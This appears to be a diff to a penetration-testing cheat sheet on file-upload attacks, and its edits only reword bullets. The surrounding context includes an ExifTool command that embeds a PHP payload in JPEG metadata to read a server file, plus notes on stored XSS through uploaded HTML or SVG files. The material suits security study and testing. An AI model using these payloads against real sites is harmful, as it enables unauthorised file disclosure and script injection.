@@ -58,7 +58,7 @@
 * [ExifTool](https://exiftool.org/)
   * Create a polyglot JPEG file containing malicious code within its metadata \*
   * `exiftool -Comment="<?php echo 'START ' . file_get_contents('<path>') . ' END'; ?>"-i <input-image> -o <output-image>`
-  * Can find the output between START and END strings
+  * Output between START and END strings
 
 #### Exploiting file upload race conditions
 
@@ -97,7 +97,8 @@ def handleResponse(req, interesting):
 
 #### Malicious Client-Side Scripts
 
-* Upload HTML files or SVG images, you can potentially use tags to create stored XSS payloads
+* Upload HTML files or SVG images
+* Use tags to create stored XSS payloads
 
 <details>
 
